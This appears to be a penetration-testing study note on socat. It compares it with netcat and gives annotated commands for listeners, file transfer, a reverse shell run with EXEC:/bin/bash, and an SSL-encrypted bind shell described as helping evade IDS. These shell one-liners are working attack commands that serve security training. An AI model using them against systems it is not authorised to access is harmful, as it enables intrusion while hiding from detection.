Established a two, bidirectional byte streams for data transfer.
Similar to nc but has additional functionality. 

## Netcat vs Socat

### Connect to a remote server on port 80 using both **nc** and **socat**:

`nc <remote server ip> 80`
vs
`socat - TCP4:<remote server ip>:80`
**"-"** allows data transfer between STDIO and remote host
**TCP4** is the protocol
 
### Setup a listener on port 443
***
 !!!Root privileges are required to bind to a listener port BELOW 1024!!!
 ***
 
 `sudo nc -lvp localhost 443`
 vs
 `sudo socat TCP4-LISTEN:443 STDOUT`
 **STDOUT** connect STDOUT to the TCP socket
 
 ## Socat File Transfers
 
 Alice: Linux
 Bob: Windows
 
 Alice wants to send bob a file: **secret_passwords.txt**
 
 kali>
 `sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt` Using socat to transfer a file over 443
 **fork** creates a chile process once a connection is made to the listener, which allows multiple connections
 **file:** specifices the input file name
 
 win>
 `socat TCP4:<kali_ip>:443 file:received_passwords.txt,create` Using socat to retrieve a file
 **file:** Specifies the output file name
 **create** Specifies a new file will be created
 
 ## Socat Reverse Shells
 
 win>
 `socat -d -d TCP4-LISTEN:443 STDOUT` Create a listener
 **-d -d** Increase verbosity: fatal, error, warning and notice message
 
 kali>
 `socat TCP4:<win_ip>:443 EXEC:/bin/bash` Sending a reverse shell
 **EXEC:** Similar to **nc -e**. Executes a program after connection is eastablished.
 
 ## Socat Encrypted Bind Shell
 
 Encryption will rely on SSL certs. This will assist in evading IDS and hide sensitive data. 
 
 ### Setting up a self-signed cert

kali>
`openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt` Setting up encryption with openssl
 **req** Initiate a new cert signing request
 **-newkey** generate a new private key
 **rsa:2048** Use RSA with a specified bit key length
 **-nodes** Store private key without passphrase protection
 **-keyout** save the key to a file
 **x509** Output self-signed cert instead of cert request
 **-days** set validity period
 **-out** Save cert to a file
 
 kali>
 `cat bind_shell.key bind_shell.crt > bind_shell.pem` cat the cert and private key into a **.pem** file for use by socat
 
 ### Setting up the connection
 
 kali>
 `sudo socat OPENSSL-LISTEN:443, cert=bind_shell.pem, verify=0, fork EXEC:/bin/bash` Create an encrypted bind shell
 **OPENSSL-LISTEN** Create a listener on port 443
 **cert=** Specify the cert file
 **verify=0*** Disable SSL verification
 
 win>
 `socat - OPENSSL:<kali_ip>, verify=0` Connect to encrypted bind shell
 **"-"** allows data transfer between STDIO and remote host
  **verify=0*** Disable SSL verification
 
 